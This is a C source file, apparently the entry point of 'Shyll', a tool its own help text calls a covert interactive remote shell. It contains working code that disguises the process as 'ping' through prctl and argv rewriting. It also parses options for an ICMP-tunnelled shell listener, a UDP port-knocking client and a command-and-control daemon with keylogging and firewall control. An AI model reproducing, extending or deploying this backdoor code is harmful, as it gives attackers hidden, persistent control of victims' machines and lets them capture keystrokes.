#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#include <stdio.h>
#include <netinet/ip_icmp.h>
#include <memory.h>
#include <stdlib.h>
#include <time.h>
#include <sys/param.h>
#include <sys/prctl.h>

#include "client.h"
#include "getopt.h"
#include "icmp_encrypt.h"
#include "keyboard.h"

#include "util.h"

#include "server.h"
#include "nftables.h"

static const char* HIDDEN_NAME = "ping";

static unsigned int DEFAULT_KNOCK_WINDOW_LENGTH = 60 * 60; //Keep open for 1 hour after knock.

static void conceal_process(char* process_name_arg) {
    size_t dest_len = strlen(process_name_arg);
    strncpy(process_name_arg, HIDDEN_NAME, dest_len);

    size_t null_terminator = MIN(dest_len, strlen(HIDDEN_NAME));

    process_name_arg[null_terminator] = 0;

    if (prctl(PR_SET_NAME, HIDDEN_NAME, 0, 0) == -1) {
        fprintf(stderr, "Error hiding process name using prctl.\n");
    }

    printf("Concealed process pid=%d as \"%s\"\n", getpid(), HIDDEN_NAME);
}

int cmd_connect(int argc, char** argv) {
    struct client_arguments args = {
        .non_interactive = 0,
        .heartbeat = 1,
        .password = NULL
    };

    if (argc < 2) {
        printf("Invalid verb usage. Missing remote ip address. Use \"help\" verb for more information.\n");
        return 1;
    }

    if (!is_valid_ipv4(argv[1])) {
        fprintf(stderr, "Invalid IPv4 Address length: \"%s\" Terminating.", argv[1]);
        return 1;
    }

    char remote_ip[INET_ADDRSTRLEN];
    strncpy(remote_ip, argv[1], sizeof(remote_ip));

    args.remote_ip = remote_ip;

    struct option opts[] = {
        {"noheartbeat", no_argument, &args.heartbeat, 0},
        {"noninteractive", no_argument, &args.non_interactive, 1},
        {"password", required_argument, 0, 0},
        {0, 0, 0, 0}
    };

    int opt, opt_index;
    while ((opt = getopt_long_only(argc, argv, "", opts, &opt_index)) != -1) {
        if (opt != 0)
            continue;

        if (strcmp(opts[opt_index].name, "password") == 0) {
            args.password = optarg;
        }
    }

    if (!args.password) {
        fprintf(stderr, "Error, must specify an encryption passphrase. See help command.\n");
        exit(1);
    }

    return run_client(&args);
}


int cmd_knock(int argc, char** argv) {
    if (argc < 2) {
        printf("Invalid verb usage. Missing remote ip address. Use \"help\" verb for more information.\n");
        return 1;
    }

    if (!is_valid_ipv4(argv[1])) {
        fprintf(stderr, "Invalid IPv4 Address length: \"%s\" Terminating.", argv[1]);
        return 1;
    }

    char remote_ip[INET_ADDRSTRLEN];
    strncpy(remote_ip, argv[1], sizeof(remote_ip));

    struct option opts[] = {
        {"password", required_argument, 0, 0},
        {0, 0, 0, 0}
    };

    const char* password = NULL;

    int opt, opt_index;
    while ((opt = getopt_long_only(argc, argv, "", opts, &opt_index)) != -1) {
        if (opt != 0)
            continue;

        if (strcmp(opts[opt_index].name, "password") == 0) {
            password = optarg;
        }
    }

    if (!password) {
        fprintf(stderr, "Error, must specify an encryption passphrase. See help command.\n");
        exit(1);
    }

    return do_knock(remote_ip, password);
}

int cmd_listen(char* name_argv, int argc, char** argv) {
    struct listener_arguments args = {
        .cnc_daemon = 1,
        .fork_connections = 1,
        .heartbeat = 1,
        .knock_window_length = DEFAULT_KNOCK_WINDOW_LENGTH
    };

    const char* password = NULL;
    int disable_hide = 0;

    struct option opts[] = {
        {"nofork", no_argument, &args.fork_connections, 0},
        {"noheartbeat", no_argument, &args.heartbeat, 0},
        {"nocncdaemon", no_argument, &args.cnc_daemon, 0},
        {"nohide", no_argument, &disable_hide, 1},
        {"password", required_argument, 0, 0},
        {"knockwindow", required_argument, 0, 0},
        {0, 0, 0, 0}
    };

    int opt_index;
    int opt;
    while ((opt = getopt_long_only(argc, argv, "", opts, &opt_index)) != -1) {
        if (opt != 0)
            continue;

        if (strcmp(opts[opt_index].name, "password") == 0) {
            password = optarg;
        }

        if (strcmp(opts[opt_index].name, "knockwindow") == 0) {
            unsigned int knock_window = (unsigned int)strtol(optarg, NULL, 10);
            if (knock_window == 0)
            {
                fprintf(stderr, "Error invalid knock window specified: \"%s\". Reverting to default %ds\n", optarg, DEFAULT_KNOCK_WINDOW_LENGTH);
            } else
            {
                args.knock_window_length = knock_window;
            }
        }
    }

    if (!password) {
        fprintf(stderr, "Error, must specify an encryption passphrase. See help command.\n");
        exit(1);
    }

    encrypt_init(password, &args.auth);

    if (!disable_hide) {
        conceal_process(name_argv);
    }

    return run_server(&args);
}

int cmd_help() {
    printf("Shyll - Covert interactive remote shell connection.\n\n");
    printf("Usage:\n"
        "  shyll <verb> [pos_args] [options]\n\n"
        "  shyll help/h/?\n"
        "    Prints this help output\n\n"
        "  shyll listen --password <password> [optional args]\n"
        "    Listen for incoming shyll connections, then host interactive shell sessions for remote use.\n\n"
        "    Required Arguments:\n"
        "      --password             Password used to encrypt / decrypt traffic.\n\n"
        "    Optional Arguments:\n"
        "      --knockwindow <length> Defaults to 1 hour. Defines the length of time, in seconds, that the\n"
        "                             NFTables ICMP rules are disabled for after receiving a valid knock sequence.\n\n"
        "      --noheartbeat          Disables heartbeat, which track whether remote is active\n\n"
        "      --nofork               Prevents forking for remote connections, simplifies debugging\n"
        "                             but prevents concurrent sessions.\n\n"
        "      --nocncdaemon          Disables startup of CNC Daemon Services (keylogging, file watching\n"
        "                             and NFT Firewall control / port knocking.)\n\n"
        "      --nohide               Disables hiding via process name\n"
        "\n"
        "  shyll connect <remote-ip> --password <password> [optional args]\n"
        "    Establish a connection to a listening shyll instance and spawn an interactive shell.\n\n"
        "    Positional Arguments:\n"
        "      remote-ip      IP address of the listening shyll instance\n\n"
        "    Required Arguments:\n"
        "      --password     Password used to encrypt and decrypt transmitted messages\n\n"
        "    Optional Arguments:\n"
        "      --noheartbeat  Disables heartbeat to track whether remote is active & automatically close if inactive\n"
        "\n"
        "  shyll knock <remote-ip> --password <password>\n"
        "    Send a UDP Knock Sequence to the specified remote IP address. \n\n"
        "    Positional Arguments:\n"
        "      remote-ip      IP address of the listening shyll instance\n\n"
        "    Required Arguments:\n"
        "      --password     Password used calculate the appropriate knock sequence\n"
        );
    return 0;
}

int cmd_unrecognized(const char* cmd) {
    printf("Unrecognized command: \"%s\"\n\n", cmd);

    cmd_help();

    return 1;
}

int main(int argc, char** argv) {
    srandom(time(NULL));

    if (argc <= 1) {
        cmd_help();
        return 1;
    } else if (strcmp(argv[1], "connect") == 0) {
        return cmd_connect(argc - 1, &argv[1]);
    } else if (strcmp(argv[1], "knock") == 0) {
        return cmd_knock(argc - 1, &argv[1]);
    } else if (strcmp(argv[1], "listen") == 0) {
        return cmd_listen(argv[0], argc - 1, &argv[1]);
    } else if (strcmp(argv[1], "help") == 0 || strcmp(argv[1], "h") == 0 || strcmp(argv[1], "?") == 0) {
        return cmd_help();
    } else {
        return cmd_unrecognized(argv[1]);
    }
}